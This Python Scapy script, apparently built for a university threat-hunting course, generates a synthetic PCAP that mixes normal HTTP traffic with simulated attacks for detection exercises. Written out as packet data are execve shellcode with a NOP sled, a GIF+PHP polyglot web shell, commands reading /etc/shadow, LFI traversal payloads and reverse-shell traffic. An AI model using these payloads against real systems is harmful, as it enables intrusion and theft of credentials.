#!/usr/bin/env python3
"""
generate_bof_pcap.py
====================
Genera un PCAP sintético con:
- ~80 paquetes de tráfico HTTP/TCP normal
- 1 exploit de buffer overflow con NOP sled + shellcode simulado
- 1 ataque de file upload con bypass de extensión (polyglot GIF+PHP)
- 1 intento de LFI post-explotación
- 1 ejecución de web shell post-upload

Curso MAR404 - Cacería de Amenazas - Clase 4
Universidad Mayor 2026
"""

import os
import random
import struct
from scapy.all import *

OUTPUT_FILE = "/data/lab7_bof_upload.pcap"

# IPs del escenario
ATTACKER_IP = "10.10.14.33"
VICTIM_IP = "192.168.1.50"
NORMAL_CLIENTS = ["192.168.1.101", "192.168.1.102", "192.168.1.103", "192.168.1.104"]
NORMAL_SERVERS = ["192.168.1.50", "172.16.0.10"]

def generate_normal_http():
    """Genera tráfico HTTP normal."""
    packets = []
    paths = ["/index.html", "/about.html", "/contact.php", "/images/logo.png",
             "/css/style.css", "/js/app.js", "/api/users", "/products/list",
             "/login.php", "/dashboard", "/assets/font.woff2", "/favicon.ico"]
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.2",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    ]
    
    for i in range(80):
        client = random.choice(NORMAL_CLIENTS)
        server = random.choice(NORMAL_SERVERS)
        sport = random.randint(49152, 65535)
        path = random.choice(paths)
        ua = random.choice(user_agents)
        
        # Request
        http_req = f"GET {path} HTTP/1.1\r\nHost: {server}\r\nUser-Agent: {ua}\r\nAccept: */*\r\n\r\n"
        pkt_req = IP(src=client, dst=server)/TCP(sport=sport, dport=80, flags="PA")/Raw(load=http_req.encode())
        packets.append(pkt_req)
        
        # Response
        http_resp = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 1024\r\nServer: Apache/2.4.57\r\n\r\n<html><body>Normal content page {i}</body></html>"
        pkt_resp = IP(src=server, dst=client)/TCP(sport=80, dport=sport, flags="PA")/Raw(load=http_resp.encode())
        packets.append(pkt_resp)
    
    return packets


def generate_buffer_overflow():
    """Genera un exploit de buffer overflow con NOP sled."""
    packets = []
    sport = 44321
    
    # Paso 1: Conexión TCP al servicio vulnerable (puerto 8080)
    syn = IP(src=ATTACKER_IP, dst=VICTIM_IP)/TCP(sport=sport, dport=8080, flags="S")
    packets.append(syn)
    
    syn_ack = IP(src=VICTIM_IP, dst=ATTACKER_IP)/TCP(sport=8080, dport=sport, flags="SA")
    packets.append(syn_ack)
    
    ack = IP(src=ATTACKER_IP, dst=VICTIM_IP)/TCP(sport=sport, dport=8080, flags="A")
    packets.append(ack)
    
    # Paso 2: Envío del exploit con NOP sled + shellcode simulado
    # NOP sled (512 bytes) + shellcode simulado (reverse shell pattern)
    nop_sled = b"\x90" * 512
    # Shellcode simulado (no funcional, solo para detección)
    # Patrón típico: push/pop/xor/call
    shellcode = (
        b"\x31\xc0"          # xor eax, eax
        b"\x50"              # push eax
        b"\x68\x2f\x2f\x73\x68"  # push "//sh"
        b"\x68\x2f\x62\x69\x6e"  # push "/bin"
        b"\x89\xe3"          # mov ebx, esp
        b"\x50"              # push eax
        b"\x53"              # push ebx
        b"\x89\xe1"          # mov ecx, esp
        b"\xb0\x0b"          # mov al, 0x0b (execve)
        b"\xcd\x80"          # int 0x80
        b"\x90" * 20         # padding
    )
    
    # Buffer overflow: "A" * overflow + return address + NOP sled + shellcode
    overflow_padding = b"A" * 260  # Overflow del buffer
    ret_address = struct.pack("<I", 0xbffff7a0)  # Return address falsa
    
    exploit_payload = overflow_padding + ret_address + nop_sled + shellcode
    
    # Enviar como request HTTP malformado
    http_exploit = b"GET /vulnerable_service HTTP/1.1\r\nHost: " + VICTIM_IP.encode() + b"\r\nX-Data: " + exploit_payload + b"\r\n\r\n"
    
    exploit_pkt = IP(src=ATTACKER_IP, dst=VICTIM_IP)/TCP(sport=sport, dport=8080, flags="PA")/Raw(load=http_exploit)
    packets.append(exploit_pkt)
    
    # Paso 3: Respuesta del servidor (crash/shell)
    # El servidor responde con un shell prompt (indica éxito del exploit)
    shell_response = b"HTTP/1.1 500 Internal Server Error\r\n\r\n"
    resp_pkt = IP(src=VICTIM_IP, dst=ATTACKER_IP)/TCP(sport=8080, dport=sport, flags="PA")/Raw(load=shell_response)
    packets.append(resp_pkt)
    
    # Paso 4: Reverse shell connection (attacker recibe shell)
    rev_syn = IP(src=VICTIM_IP, dst=ATTACKER_IP)/TCP(sport=random.randint(40000,50000), dport=4444, flags="S")
    packets.append(rev_syn)
    
    rev_sa = IP(src=ATTACKER_IP, dst=VICTIM_IP)/TCP(sport=4444, dport=rev_syn[TCP].sport, flags="SA")
    packets.append(rev_sa)
    
    # Comandos en la reverse shell
    shell_cmds = [
        b"id\n",
        b"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n",
        b"uname -a\n",
        b"Linux victim 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux\n",
        b"cat /etc/passwd | head -5\n",
        b"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
    ]
    
    for cmd in shell_cmds:
        cmd_pkt = IP(src=ATTACKER_IP, dst=VICTIM_IP)/TCP(sport=4444, dport=rev_syn[TCP].sport, flags="PA")/Raw(load=cmd)
        packets.append(cmd_pkt)
    
    return packets


def generate_file_upload_attack():
    """Genera un ataque de file upload con bypass de extensión."""
    packets = []
    sport = 55123
    
    # Polyglot file: GIF magic bytes + PHP code
    gif_magic = b"GIF89a"
    php_shell = b"<?php system($_GET['cmd']); ?>"
    malicious_file = gif_magic + b"\x00" * 10 + php_shell
    
    # HTTP POST multipart con file upload
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    upload_body = (
        f"------{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"avatar.php.gif\"\r\n"
        f"Content-Type: image/gif\r\n\r\n"
    ).encode() + malicious_file + f"\r\n------{boundary}--\r\n".encode()
    
    http_upload = (
        f"POST /upload.php HTTP/1.1\r\n"
        f"Host: {VICTIM_IP}\r\n"
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0\r\n"
        f"Content-Type: multipart/form-data; boundary=----{boundary}\r\n"
        f"Content-Length: {len(upload_body)}\r\n"
        f"Cookie: PHPSESSID=abc123def456\r\n\r\n"
    ).encode() + upload_body
    
    upload_pkt = IP(src=ATTACKER_IP, dst=VICTIM_IP)/TCP(sport=sport, dport=80, flags="PA")/Raw(load=http_upload)
    packets.append(upload_pkt)
    
    # Respuesta exitosa del servidor
    upload_resp = b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"status\":\"success\",\"path\":\"/uploads/avatar.php.gif\"}"
    resp_pkt = IP(src=VICTIM_IP, dst=ATTACKER_IP)/TCP(sport=80, dport=sport, flags="PA")/Raw(load=upload_resp)
    packets.append(resp_pkt)
    
    # Ejecución del web shell
    sport2 = 55200
    shell_exec = f"GET /uploads/avatar.php.gif?cmd=id HTTP/1.1\r\nHost: {VICTIM_IP}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    exec_pkt = IP(src=ATTACKER_IP, dst=VICTIM_IP)/TCP(sport=sport2, dport=80, flags="PA")/Raw(load=shell_exec.encode())
    packets.append(exec_pkt)
    
    exec_resp = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\nGIF89a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00uid=33(www-data) gid=33(www-data)"
    exec_resp_pkt = IP(src=VICTIM_IP, dst=ATTACKER_IP)/TCP(sport=80, dport=sport2, flags="PA")/Raw(load=exec_resp)
    packets.append(exec_resp_pkt)
    
    # Segundo comando: cat /etc/shadow
    sport3 = 55201
    shell_exec2 = f"GET /uploads/avatar.php.gif?cmd=cat%20/etc/shadow HTTP/1.1\r\nHost: {VICTIM_IP}\r\n\r\n"
    exec_pkt2 = IP(src=ATTACKER_IP, dst=VICTIM_IP)/TCP(sport=sport3, dport=80, flags="PA")/Raw(load=shell_exec2.encode())
    packets.append(exec_pkt2)
    
    return packets


def generate_lfi_attempt():
    """Genera intentos de LFI post-explotación."""
    packets = []
    
    lfi_paths = [
        "/page.php?file=../../etc/passwd",
        "/page.php?file=....//....//etc/shadow",
        "/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd",
        "/include.php?page=../../../var/log/apache2/access.log",
    ]
    
    for i, path in enumerate(lfi_paths):
        sport = 56000 + i
        req = f"GET {path} HTTP/1.1\r\nHost: {VICTIM_IP}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
        pkt = IP(src=ATTACKER_IP, dst=VICTIM_IP)/TCP(sport=sport, dport=80, flags="PA")/Raw(load=req.encode())
        packets.append(pkt)
    
    return packets


def main():
    """Genera el PCAP completo."""
    os.makedirs("/data", exist_ok=True)
    
    all_packets = []
    
    # Tráfico normal
    normal = generate_normal_http()
    all_packets.extend(normal)
    
    # Buffer overflow exploit
    bof = generate_buffer_overflow()
    all_packets.extend(bof)
    
    # File upload attack
    upload = generate_file_upload_attack()
    all_packets.extend(upload)
    
    # LFI attempts
    lfi = generate_lfi_attempt()
    all_packets.extend(lfi)
    
    # Mezclar (pero mantener orden lógico de ataques)
    # Insertar tráfico normal entre los ataques
    random.shuffle(normal)
    
    final_packets = []
    normal_idx = 0
    attack_packets = bof + upload + lfi
    
    # Intercalar: 3-5 normales, luego 1 ataque
    for atk in attack_packets:
        n_normal = random.randint(3, 5)
        for _ in range(n_normal):
            if normal_idx < len(normal):
                final_packets.append(normal[normal_idx])
                normal_idx += 1
        final_packets.append(atk)
    
    # Agregar normales restantes
    final_packets.extend(normal[normal_idx:])
    
    # Escribir PCAP
    wrpcap(OUTPUT_FILE, final_packets)
    
    print(f"[+] PCAP generado: {OUTPUT_FILE}")
    print(f"[+] Total paquetes: {len(final_packets)}")
    print(f"[+] Tráfico normal: {len(normal)} paquetes")
    print(f"[+] Buffer overflow: {len(bof)} paquetes (NOP sled 512 bytes)")
    print(f"[+] File upload: {len(upload)} paquetes (polyglot GIF+PHP)")
    print(f"[+] LFI attempts: {len(lfi)} paquetes")
    print(f"[+] Atacante: {ATTACKER_IP}")
    print(f"[+] Víctima: {VICTIM_IP}")


if __name__ == "__main__":
    main()
